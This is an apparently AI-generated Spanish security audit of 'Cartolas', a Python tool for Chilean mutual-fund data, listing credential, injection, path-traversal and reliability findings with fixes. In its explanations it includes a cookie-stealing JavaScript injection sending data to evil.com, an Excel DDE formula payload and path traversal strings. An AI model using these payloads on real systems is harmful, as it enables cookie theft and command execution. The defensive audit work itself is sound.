# REPORTE DE SEGURIDAD INTEGRAL — CARTOLAS

**Fecha:** 16 de marzo de 2026
**Auditor:** Claude Code (Opus 4.6)
**Alcance:** Codebase completo `/Users/franciscoerrandonea/code/cartolas/`
**Basado en:** 21 auditorías previas + análisis directo del código fuente

---

## 1. Resumen Ejecutivo

| Métrica | Valor |
|---------|-------|
| **Postura de seguridad general** | **MEDIA (5.5/10)** |
| Vulnerabilidades Críticas | 3 |
| Vulnerabilidades Altas | 5 |
| Vulnerabilidades Medias | 10 |
| Vulnerabilidades Bajas | 12 |
| Cobertura de tests | 0% |
| Llamadas `print()` (sin logging) | 142+ |
| `except Exception` genéricos | 7 |
| Timeouts HTTP faltantes | 3+ |

### Acciones inmediatas requeridas

1. **Rotar TODAS las credenciales** (SendGrid, BCCh, Azure Storage) — están en texto plano en `.env`
2. **Corregir NameError** en `eco/bcentral.py:206-227` — causa crash en producción
3. **Agregar timeouts** a todas las llamadas HTTP — riesgo de cuelgue indefinido

### Contexto del proyecto

Cartolas es una herramienta CLI/batch para análisis de fondos mutuos chilenos. No es una aplicación web, lo que reduce significativamente la superficie de ataque. Sin embargo, interactúa con APIs externas (CMF, BCCh, El Mercurio) y maneja credenciales sensibles.

---

## 2. Vulnerabilidades Críticas (Corregir Inmediatamente)

### VULN-01: Credenciales en texto plano en `.env`

| Campo | Detalle |
|-------|---------|
| **Severidad** | CRÍTICA (10/10) |
| **CWE** | CWE-798 (Uso de Credenciales Hardcoded), CWE-321 (Clave Criptográfica Hardcoded) |
| **Archivo** | `.env` (raíz del proyecto) |
| **Evidencia** | SendGrid API key, BCCh usuario/contraseña, Azure Storage connection string, email personal |

**Por qué importa:** Si alguien obtiene acceso al filesystem (o si `.env` se commitea accidentalmente), obtiene acceso completo a SendGrid (envío de emails), API del Banco Central, y Azure Storage con todos los datos del proyecto.

**Notas de explotabilidad:** El `.env` está en `.gitignore` y nunca fue commiteado al repositorio. Sin embargo, las credenciales están en texto plano sin cifrar, accesibles a cualquier proceso con acceso al filesystem del usuario.

**Remediación:**

```bash
# 1. Rotar TODAS las credenciales inmediatamente
# 2. Verificar que .env nunca estuvo en git history
git log --all --full-history -- .env

# 3. Si alguna vez estuvo, limpiar historial
git filter-repo --path .env --invert-paths --force
```

```python
# 4. Usar variables de entorno del sistema en vez de .env
import os

BCCH_USER = os.environ["BCCH_USER"]  # Falla explícitamente si no existe
BCCH_PASS = os.environ["BCCH_PASS"]
```

**Defensa en profundidad:**
- Migrar a Azure Key Vault o AWS Secrets Manager para producción
- Crear `.env.example` con valores placeholder para documentación
- Implementar política de rotación de credenciales (cada 90 días mínimo)

---

### VULN-02: NameError en `update_bcch_parquet()` — Bug en producción

| Campo | Detalle |
|-------|---------|
| **Severidad** | CRÍTICA (9/10) |
| **CWE** | CWE-457 (Uso de Variable No Inicializada) |
| **Archivo** | `eco/bcentral.py:206-227` |
| **Evidencia** | Variable `df` indefinida si se captura `FileNotFoundError` |

**Por qué importa:** Causa `UnboundLocalError` en producción cuando el archivo parquet de BCCh no existe, interrumpiendo todo el pipeline de actualización.

**Reproducción:**
```bash
# Eliminar el archivo parquet de BCCh y ejecutar
rm cartolas/data/bcch/bcch.parquet
uv run python actualiza_parquet.py
# Resultado: UnboundLocalError: local variable 'df' referenced before assignment
```

**Remediación:**

```python
# eco/bcentral.py — inicializar df antes del try
def update_bcch_parquet():
    df = None  # ← AGREGAR ESTA LÍNEA
    try:
        df = pl.scan_parquet(BCCH_PARQUET_PATH)
        # ...
    except FileNotFoundError:
        # df permanece None, no causa error
        pass

    if df is not None:
        # procesar...
```

---

### VULN-03: Credenciales cargadas al importar módulo

| Campo | Detalle |
|-------|---------|
| **Severidad** | CRÍTICA (9/10) |
| **CWE** | CWE-459 (Limpieza Incompleta), CWE-312 (Almacenamiento en Texto Claro) |
| **Archivos** | `eco/bcentral.py:18,24-25,32`, `cartolas/economy.py:1-6` |
| **Evidencia** | `BCCh = bcchapi.Siete(usr=BCCH_USER, pwd=BCCH_PASS)` al nivel de módulo |

**Por qué importa:** Cualquier `import eco.bcentral` (incluso si no se usa la API) carga credenciales en memoria y crea una sesión autenticada. Si `.env` no existe, el import falla con `KeyError` críptico.

**Remediación:**

```python
# eco/bcentral.py — inicialización lazy
from functools import lru_cache
from dotenv import dotenv_values

@lru_cache(maxsize=1)
def get_bcch_client():
    """Crea cliente BCCh solo cuando se necesita."""
    env = dotenv_values(".env")
    user = env.get("BCCH_USER")
    pwd = env.get("BCCH_PASS")
    if not user or not pwd:
        raise EnvironmentError("BCCH_USER y BCCH_PASS requeridos en .env")
    return bcchapi.Siete(usr=user, pwd=pwd)

# Uso: get_bcch_client().cuadro(...)  en vez de  BCCh.cuadro(...)
```

---

## 3. Vulnerabilidades Altas (Corregir en 1 semana)

### VULN-04: Inyección JavaScript via Playwright `evaluate()`

| Campo | Detalle |
|-------|---------|
| **Severidad** | ALTA (7/10) |
| **CWE** | CWE-95 (Inyección de Código en Evaluación Dinámica) |
| **Archivo** | `cartolas/download.py:81-82` |
| **Evidencia** | `page.evaluate(f"...'{start_date}'...")` — interpolación directa |

**Por qué importa:** Aunque las fechas provienen de código interno, el patrón es peligroso. Si alguna ruta permitiera fechas controladas por usuario, se podría inyectar JavaScript arbitrario en el contexto del navegador Playwright.

**PoC (teórico):**
```python
# Si start_date = "2024-01-01'; document.location='http://evil.com?c='+document.cookie; //"
page.evaluate(f"document.querySelector('#txt_inicio').value = '{start_date}';")
# Se ejecutaría código JavaScript arbitrario
```

**Remediación:**

```python
# ANTES (vulnerable):
page.evaluate(f"document.querySelector('#txt_inicio').value = '{start_date}';")
page.evaluate(f"document.querySelector('#txt_termino').value = '{end_date}';")

# DESPUÉS (seguro — usar API nativa de Playwright):
page.locator('#txt_inicio').fill(start_date)
page.locator('#txt_termino').fill(end_date)
```

---

### VULN-05: Llamadas HTTP sin timeout (cuelgue indefinido)

| Campo | Detalle |
|-------|---------|
| **Severidad** | ALTA (8/10) |
| **CWE** | CWE-400 (Consumo No Controlado de Recursos) |
| **Archivos** | `comparador/elmer.py:89`, `cartolas/fund_identifica.py:26` |
| **Evidencia** | `requests.get(url)` sin parámetro `timeout` |

**Por qué importa:** Si el servidor de El Mercurio o la CMF no responde, el proceso se cuelga indefinidamente sin posibilidad de recovery. Esto puede bloquear pipelines automatizados.

**Remediación:**

```python
# comparador/elmer.py:89
# ANTES:
response = requests.get(url)

# DESPUÉS:
response = requests.get(url, timeout=30)
response.raise_for_status()
```

```python
# cartolas/fund_identifica.py:26
# ANTES:
response = requests.get(url, headers=headers)

# DESPUÉS:
response = requests.get(url, headers=headers, timeout=30)
response.raise_for_status()
```

---

### VULN-06: Doble decorador de retry causa esperas de 2+ horas

| Campo | Detalle |
|-------|---------|
| **Severidad** | ALTA (7/10) |
| **CWE** | CWE-400 (Consumo No Controlado de Recursos) |
| **Archivo** | `cartolas/download.py:29-30` |
| **Evidencia** | `@exp_retry_function` + `@retry_function` apilados |

**Por qué importa:** 12 reintentos externos × 10 internos = 120 reintentos posibles. Con backoff exponencial, puede esperar más de 2 horas antes de reportar fallo. Si la CMF está caída, el proceso queda bloqueado.

**Remediación:**

```python
# ANTES:
@exp_retry_function(max_attempts=12)
@retry_function(max_attempts=10, delay=10)
def download_cartola(...):

# DESPUÉS — un solo decorador con tope razonable:
@exp_retry_function(max_attempts=5)  # ~62 segundos máximo de espera total
def download_cartola(...):
```

---

### VULN-07: Path traversal en nombre de archivo descargado

| Campo | Detalle |
|-------|---------|
| **Severidad** | ALTA (7/10) |
| **CWE** | CWE-22 (Path Traversal) |
| **Archivo** | `cartolas/download.py:112` |
| **Evidencia** | `download.suggested_filename` usado sin sanitizar |

**Por qué importa:** Si el servidor CMF fuera comprometido, podría sugerir nombres como `../../etc/cron.d/malicious`, escribiendo archivos fuera del directorio esperado.

**Remediación:**

```python
from pathlib import PurePosixPath

# ANTES:
filename = download.suggested_filename

# DESPUÉS:
raw_name = download.suggested_filename
filename = PurePosixPath(raw_name).name  # Extrae solo el nombre base

# Verificar que el path resuelto está dentro del directorio permitido
dest = (TXT_FOLDER / filename).resolve()
if not str(dest).startswith(str(TXT_FOLDER.resolve())):
    raise ValueError(f"Nombre de archivo sospechoso: {raw_name}")
```

---

### VULN-08: Path traversal en renombrado de captcha

| Campo | Detalle |
|-------|---------|
| **Severidad** | ALTA (6/10) |
| **CWE** | CWE-22 (Path Traversal) |
| **Archivo** | `cartolas/download.py:77` |
| **Evidencia** | `temp_file_path.rename(error_folder / f"{prediction}.png")` |

**Por qué importa:** Si la predicción del captcha contiene caracteres especiales (ej: `../../etc/passwd`), el archivo se renombra fuera del directorio de errores.

**Remediación:**

```python
import re

# Validar que prediction solo contiene alfanuméricos
if not re.match(r'^[a-zA-Z0-9]+$', prediction):
    prediction = "invalid"

safe_path = (error_folder / f"{prediction}.png").resolve()
if not str(safe_path).startswith(str(error_folder.resolve())):
    raise ValueError("Path traversal detectado en predicción de captcha")
temp_file_path.rename(safe_path)
```

---

## 4. Vulnerabilidades Medias (Corregir en 1 mes)

### VULN-09: Excepciones genéricas ocultan errores reales

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (6/10) |
| **CWE** | CWE-754 (Manejo Impropio de Condiciones Excepcionales) |
| **Archivos** | `utiles/decorators.py:35-39,70-76`, `utiles/file_tools.py`, `utiles/fechas.py`, `cartolas/download.py` |
| **Evidencia** | 7 instancias de `except Exception as e` |

**Remediación:**

```python
# ANTES:
except Exception as e:
    print(f"Error: {e}")

# DESPUÉS — capturar excepciones específicas:
except (requests.RequestException, TimeoutError, OSError) as e:
    logger.warning(f"Error recuperable en {func.__name__}: {type(e).__name__}")
except Exception as e:
    logger.error(f"Error inesperado en {func.__name__}", exc_info=True)
    raise  # Re-lanzar excepciones no esperadas
```

---

### VULN-10: Fechas hardcodeadas causan análisis incorrectos

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (8/10) — impacto en datos, no en seguridad |
| **CWE** | N/A (defecto lógico) |
| **Archivo** | `comparador/tablas.py:49-58` |
| **Evidencia** | `date(2025, 2, 28)` y `date(2024, 12, 31)` hardcodeados |

**Por qué importa:** Los rangos de comparación 1M, 3M, 6M, 1Y, 3Y, 5Y están congelados en fechas de 2024/2025. El análisis CLA mensual produce datos incorrectos.

**Remediación:**

```python
# ANTES:
fecha_final = date(2025, 2, 28)

# DESPUÉS — usar funciones dinámicas de utiles/fechas.py:
from utiles.fechas import get_last_business_day
fecha_final = get_last_business_day()
```

---

### VULN-11: Sin validación de respuesta JSON de El Mercurio

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (5/10) |
| **CWE** | CWE-20 (Validación Insuficiente de Input) |
| **Archivo** | `comparador/elmer.py:118-138` |
| **Evidencia** | `FONDOFULL.split("-")[1]` sin verificar que `"-"` existe |

**Remediación:**

```python
# Validar estructura antes de procesar
if "-" not in fondo.get("FONDOFULL", ""):
    logger.warning(f"Formato inesperado en FONDOFULL: {fondo.get('FONDOFULL')}")
    continue

parts = fondo["FONDOFULL"].split("-")
if len(parts) < 2:
    continue
nombre = parts[1].strip()
```

---

### VULN-12: `fill_null(1)` y `fill_nan(1)` enmascaran datos corruptos

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (6/10) |
| **CWE** | N/A (integridad de datos) |
| **Archivos** | `comparador/merge.py:77,117-126`, `comparador/cla_monthly.py:132-141` |
| **Evidencia** | `.fill_null(1)` para tipo de cambio, `.fill_nan(1)` para rentabilidad |

**Por qué importa:** Si faltan datos de tipo de cambio USD/EUR, se asume 1:1 silenciosamente. Fondos denominados en USD/EUR muestran rentabilidades artificialmente incorrectas.

**Remediación:**

```python
# ANTES:
.fill_null(1)  # Asume tipo de cambio 1:1

# DESPUÉS:
.with_columns(
    pl.when(pl.col("tipo_cambio").is_null())
    .then(pl.lit(None))  # Mantener como null
    .otherwise(pl.col("tipo_cambio"))
    .alias("tipo_cambio")
)
# Filtrar filas sin tipo de cambio en vez de asumir 1.0
```

---

### VULN-13: Sin framework de logging (142+ print statements)

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (6/10) |
| **CWE** | CWE-778 (Logging Insuficiente) |
| **Archivos** | 22 archivos con 142+ llamadas a `print()` |
| **Evidencia** | Sin niveles de log, sin rotación, sin persistencia |

**Remediación:**

```python
# Crear utiles/logger.py
import logging

def setup_logger(name: str, level: int = logging.INFO) -> logging.Logger:
    logger = logging.getLogger(name)
    logger.setLevel(level)

    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    ))
    logger.addHandler(handler)

    return logger

# Uso en cada módulo:
logger = setup_logger(__name__)
logger.info("Descargando cartola...")
logger.error("Error de conexión", exc_info=True)
```

---

### VULN-14: Inyección de fórmulas en Excel

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (4/10) |
| **CWE** | CWE-1236 (Inyección de Fórmulas CSV/Excel) |
| **Archivo** | `comparador/cla_monthly.py:451-453` |
| **Evidencia** | Nombres de fondos de API externa escritos directo a Excel |

**Por qué importa:** Si la API de El Mercurio fuera comprometida, podría inyectar fórmulas como `=CMD|'/C calc'!A0` en los nombres de fondos.

**Remediación:**

```python
# Al crear el writer de xlsxwriter:
writer = pd.ExcelWriter(path, engine='xlsxwriter')
writer.book.strings_to_formulas = False  # Desactivar interpretación de fórmulas
writer.book.strings_to_urls = False      # Desactivar URLs automáticas
```

---

### VULN-15: Archivos temporales inseguros

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (5/10) |
| **CWE** | CWE-377 (Archivo Temporal Inseguro) |
| **Archivo** | `cartolas/config.py:58-61` |
| **Evidencia** | Temp files en directorio de aplicación, nombre generado una vez al importar |

**Remediación:**

```python
import tempfile

def get_secure_temp_file() -> Path:
    """Genera archivo temporal seguro para imágenes CAPTCHA."""
    temp_dir = Path(tempfile.gettempdir()) / "cartolas_temp"
    temp_dir.mkdir(mode=0o700, exist_ok=True)
    fd, path = tempfile.mkstemp(suffix=".png", dir=str(temp_dir))
    os.close(fd)
    return Path(path)
```

---

### VULN-16: Decoradores pierden metadata de funciones

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (5/10) |
| **CWE** | N/A |
| **Archivo** | `utiles/decorators.py:30,65` |
| **Evidencia** | Falta `@wraps(func)` en `retry_function` y `exp_retry_function` |

**Remediación:**

```python
from functools import wraps

def retry_function(max_attempts=10, delay=10):
    def decorator(func):
        @wraps(func)  # ← AGREGAR
        def wrapper(*args, **kwargs):
            # ...
        return wrapper
    return decorator
```

---

### VULN-17: Importación circular `config.py` ↔ `file_tools.py`

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (5/10) |
| **CWE** | N/A (defecto arquitectural) |
| **Archivos** | `cartolas/config.py:55` ↔ `utiles/file_tools.py:53` |

**Remediación:** Mover `generate_hash_image_name` a un módulo sin dependencia de `config.py`, o pasar `CARTOLAS_FOLDER` como parámetro.

---

### VULN-18: Email personal hardcodeado en código fuente

| Campo | Detalle |
|-------|---------|
| **Severidad** | MEDIA (5/10) |
| **CWE** | CWE-200 (Exposición de Información Sensible) |
| **Archivo** | `cartolas/config.py:116-120` |
| **Evidencia** | `francisco@soyfocus.com` en código fuente |

**Remediación:** Mover a `.env` o variable de entorno.

---

## 5. Vulnerabilidades Bajas (Corregir en próxima release)

### VULN-19: `random` en vez de `secrets` para nombres de archivos

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **CWE** | CWE-330 (Uso de Valores Insuficientemente Aleatorios) |
| **Archivo** | `utiles/file_tools.py:29-30` |

**Remediación:** Reemplazar `random.choices()` con `secrets.token_hex(8)`.

---

### VULN-20: Dependencias sin tope de versión superior

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **CWE** | CWE-1104 (Componentes de Terceros No Mantenidos) |
| **Archivo** | `pyproject.toml:7-17` |

**Remediación:**

```toml
# ANTES:
"playwright>=1.49.0",

# DESPUÉS:
"playwright>=1.49.0,<2.0.0",
```

---

### VULN-21: Sin rate limiting en llamadas a API de El Mercurio

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **CWE** | CWE-770 (Asignación de Recursos Sin Límites) |
| **Archivo** | `comparador/elmer.py:154-159` |

**Remediación:** Agregar `time.sleep(0.5)` entre llamadas.

---

### VULN-22: Mensajes de error filtran rutas del sistema

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (2/10) |
| **CWE** | CWE-209 (Exposición de Información por Mensajes de Error) |
| **Archivos** | Múltiples (`decorators.py`, `file_tools.py`, `fechas.py`) |

**Remediación:** Usar logging con nivel apropiado y no exponer rutas completas.

---

### VULN-23: Decoradores lanzan `Exception` genérica perdiendo tipo original

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (4/10) |
| **CWE** | CWE-755 (Manejo Incorrecto de Condiciones Excepcionales) |
| **Archivo** | `utiles/decorators.py:40-42,77-79` |

**Remediación:** Re-lanzar la excepción original con `raise last_exception from None`.

---

### VULN-24: Constantes SoyFocus duplicadas en 4 archivos

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **Archivos** | `config.py:105`, `cla_monthly.py:41-45`, `merge.py:257-262`, `resumen_apv.py:13` |

**Remediación:** Centralizar en `config.py` con vistas derivadas.

---

### VULN-25: Scripts duplicados `cla_mensual.py` vs `cla_mensual2.py`

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |

**Remediación:** Unificar en un solo script con parámetro CLI.

---

### VULN-26: Cálculos de configuración al import time

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (4/10) |
| **Archivo** | `cartolas/config.py:67-68` |
| **Evidencia** | `FECHA_MAXIMA` y `DIAS_ATRAS` evaluados al importar |

**Remediación:** Convertir a funciones con evaluación lazy.

---

### VULN-27: Cache de El Mercurio con side effects al importar

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **Archivo** | `comparador/elmer.py:17-21` |

**Remediación:** Generar nombre de archivo al guardar, no al importar.

---

### VULN-28: Módulo `cla_monthly.py` demasiado grande (650 líneas)

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |

**Remediación:** Separar en `cla_monthly.py` (pipeline) + `cla_excel.py` (formateo).

---

### VULN-29: Código muerto y variables sin usar

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (2/10) |
| **Archivos** | `cartolas/fund_identifica.py` (función `cmf_to_pl` duplica `cmf_text_to_df`, dict `columnas` sin usar) |

---

### VULN-30: Duplicación de código ~300 líneas

| Campo | Detalle |
|-------|---------|
| **Severidad** | BAJA (3/10) |
| **Archivos** | `cartolas/update.py` vs `update_by_year.py` (~80% duplicado), patrón shift/over repetido 4x |

---

## 6. Recomendaciones de Seguridad

### Prioridades de implementación

| Prioridad | Acción | Esfuerzo | Impacto |
|-----------|--------|----------|---------|
| 🔴 P0 | Rotar credenciales | 1 hora | Elimina riesgo de acceso no autorizado |
| 🔴 P0 | Fix NameError bcentral.py | 5 min | Elimina crash en producción |
| 🔴 P0 | Lazy loading de credenciales | 30 min | Reduce exposición de credenciales |
| 🟠 P1 | Timeouts en HTTP requests | 15 min | Previene cuelgues indefinidos |
| 🟠 P1 | Sanitizar paths de archivos | 30 min | Previene path traversal |
| 🟠 P1 | Fix Playwright evaluate() | 10 min | Elimina vector de inyección |
| 🟡 P2 | Implementar logging | 2 horas | Visibilidad de errores y auditoría |
| 🟡 P2 | Fix fechas hardcodeadas | 15 min | Corrige análisis incorrectos |
| 🟡 P2 | Excepciones específicas | 1 hora | Errores más claros y recuperables |
| 🟢 P3 | Tests básicos con pytest | 4 horas | Detectar regresiones |
| 🟢 P3 | Pinear dependencias | 15 min | Builds reproducibles |

### Herramientas de seguridad a adoptar

1. **`bandit`** — Análisis estático de seguridad para Python
   ```bash
   uv add --dev bandit
   uv run bandit -r cartolas/ comparador/ eco/ utiles/
   ```

2. **`safety`** — Verificación de vulnerabilidades en dependencias
   ```bash
   uv add --dev safety
   uv run safety check
   ```

3. **`pip-audit`** — Auditoría de dependencias
   ```bash
   uv add --dev pip-audit
   uv run pip-audit
   ```

4. **`ruff`** — Ya incluido; agregar reglas de seguridad
   ```toml
   # pyproject.toml
   [tool.ruff.lint]
   select = ["E", "W", "F", "S"]  # S = flake8-bandit security rules
   ```

### Mejoras de proceso

1. Agregar pre-commit hooks con `bandit` y `ruff`
2. Implementar CI/CD con GitHub Actions para validación automática
3. Revisar dependencias mensualmente con `safety check`
4. Documentar procedimiento de rotación de credenciales

---

## 7. Checklist de Cumplimiento

### OWASP Top 10 (2021)

| # | Categoría | Estado | Notas |
|---|-----------|--------|-------|
| A01 | Control de Acceso Roto | ⚠️ PARCIAL | No aplica (CLI), pero credenciales en texto plano |
| A02 | Fallas Criptográficas | ❌ FALLA | Credenciales sin cifrar en `.env` |
| A03 | Inyección | ⚠️ PARCIAL | JS injection en Playwright, path traversal en descargas |
| A04 | Diseño Inseguro | ⚠️ PARCIAL | Sin validación de inputs externos, sin principio de mínimo privilegio |
| A05 | Configuración Incorrecta | ⚠️ PARCIAL | Dependencias sin pinear, excepciones genéricas |
| A06 | Componentes Vulnerables | ⚠️ NO VERIFICADO | Sin auditoría de dependencias automatizada |
| A07 | Fallas de Autenticación | ❌ FALLA | Credenciales hardcoded, sin rotación |
| A08 | Fallas de Integridad de Software/Datos | ⚠️ PARCIAL | Sin CI/CD, sin verificación de integridad |
| A09 | Fallas de Logging y Monitoreo | ❌ FALLA | Solo `print()`, sin logging estructurado |
| A10 | Server-Side Request Forgery | ✅ PASA | URLs de APIs son constantes internas |

### PCI DSS

**No aplica** — El proyecto no procesa pagos ni datos de tarjetas.

### GDPR

**No aplica directamente** — El proyecto maneja datos financieros públicos de fondos mutuos chilenos, no datos personales de ciudadanos EU. Sin embargo, el email personal en `config.py` (VULN-18) debería moverse fuera del código.

### SOC 2

| Principio | Estado | Notas |
|-----------|--------|-------|
| Seguridad | ⚠️ PARCIAL | Credenciales expuestas, sin tests |
| Disponibilidad | ⚠️ PARCIAL | Sin timeouts, retry excesivo puede bloquear |
| Integridad de Procesamiento | ⚠️ PARCIAL | fill_null/fill_nan enmascaran datos corruptos |
| Confidencialidad | ❌ FALLA | Credenciales en texto plano |
| Privacidad | ✅ PASA | No procesa datos personales |

---

## 8. Guía de Verificación

### Test 1: Verificar que `.env` no está en git history

```bash
git log --all --full-history -- .env
# Esperado: sin resultados (nunca fue commiteado)
```

### Test 2: Verificar timeout en requests

```bash
# Buscar llamadas requests.get sin timeout
grep -rn "requests.get" cartolas/ comparador/ --include="*.py"
# Verificar que cada resultado incluye timeout=
```

### Test 3: Verificar que no hay JavaScript interpolado

```bash
# Buscar f-strings con page.evaluate
grep -rn "page.evaluate(f" cartolas/ --include="*.py"
# Esperado: sin resultados después del fix
```

### Test 4: Verificar NameError fix en bcentral

```bash
# Simular archivo faltante
mv cartolas/data/bcch/bcch.parquet cartolas/data/bcch/bcch.parquet.bak
uv run python -c "from eco.bcentral import update_bcch_parquet; update_bcch_parquet()"
mv cartolas/data/bcch/bcch.parquet.bak cartolas/data/bcch/bcch.parquet
# Esperado: sin UnboundLocalError
```

### Test 5: Verificar path traversal protection

```python
# test_path_traversal.py
from pathlib import PurePosixPath

# Simular nombre malicioso
malicious = "../../etc/passwd.txt"
safe = PurePosixPath(malicious).name
assert safe == "passwd.txt", f"Path traversal no sanitizado: {safe}"
print("✓ Path traversal protection OK")
```

### Test 6: Ejecutar bandit (análisis estático)

```bash
uv add --dev bandit
uv run bandit -r cartolas/ comparador/ eco/ utiles/ -f json -o audits/bandit_report.json
```

### Test 7: Auditar dependencias

```bash
uv add --dev pip-audit
uv run pip-audit
```

---

## 9. Puntuación de Riesgo

| Categoría | Puntuación (0-10) | Peso | Ponderado |
|-----------|-------------------|------|-----------|
| Gestión de Credenciales | 8/10 (alto riesgo) | 30% | 2.4 |
| Validación de Input | 5/10 (riesgo medio) | 20% | 1.0 |
| Manejo de Errores | 6/10 (riesgo medio) | 15% | 0.9 |
| Integridad de Datos | 5/10 (riesgo medio) | 15% | 0.75 |
| Logging y Monitoreo | 7/10 (alto riesgo) | 10% | 0.7 |
| Dependencias | 3/10 (riesgo bajo) | 10% | 0.3 |
| **TOTAL** | | | **6.05/10** |

> **Puntuación de riesgo global: 6.05/10** — Riesgo moderado-alto. Las 5 correcciones prioritarias (credenciales, NameError, timeouts, path traversal, logging) reducirían la puntuación a ~3/10.

---

## 10. Top 5 Correcciones que Reducen Riesgo Más Rápido

1. **Rotar credenciales + implementar lazy loading** → Elimina VULN-01, VULN-03 → -2.0 puntos de riesgo
2. **Agregar timeouts y validación HTTP** → Elimina VULN-05, VULN-06 → -0.5 puntos de riesgo
3. **Fix NameError + excepciones específicas** → Elimina VULN-02, VULN-09 → -0.5 puntos de riesgo
4. **Sanitizar paths de archivos** → Elimina VULN-07, VULN-08 → -0.3 puntos de riesgo
5. **Implementar logging básico** → Elimina VULN-13 → -0.7 puntos de riesgo

**Reducción total estimada: ~4.0 puntos → Riesgo residual: ~2/10 (bajo)**

---

## Checklist Diff (Pasa/Falla/No Aplica)

| Check | Estado |
|-------|--------|
| Credenciales fuera del código fuente | ❌ FALLA |
| Credenciales cifradas en reposo | ❌ FALLA |
| Rotación de credenciales documentada | ❌ FALLA |
| .env en .gitignore | ✅ PASA |
| .env nunca commiteado | ✅ PASA |
| Timeouts en HTTP requests | ❌ FALLA |
| Validación de status HTTP | ❌ FALLA |
| SSL verification explícita | ⚠️ NO VERIFICADO |
| Input validation en datos externos | ❌ FALLA |
| Path traversal prevention | ❌ FALLA |
| Logging estructurado | ❌ FALLA |
| Tests de seguridad automatizados | ❌ FALLA |
| Dependencias auditadas | ❌ FALLA |
| Dependencias pineadas con tope | ❌ FALLA |
| Archivos temporales seguros | ❌ FALLA |
| Excel formula injection prevention | ❌ FALLA |
| Rate limiting en APIs externas | ❌ FALLA |
| Manejo de errores específico | ❌ FALLA |
| CI/CD pipeline | ❌ FALLA |
| Código muerto eliminado | ❌ FALLA |
| Sin duplicación de código | ❌ FALLA |
| Principio de mínimo privilegio | ⚠️ PARCIAL |
| Datos sensibles en logs | ⚠️ NO VERIFICADO |

---

*Reporte generado automáticamente por Claude Code (Opus 4.6) el 16 de marzo de 2026.*
*Basado en análisis estático del código fuente y 21 auditorías previas del directorio `audits/`.*
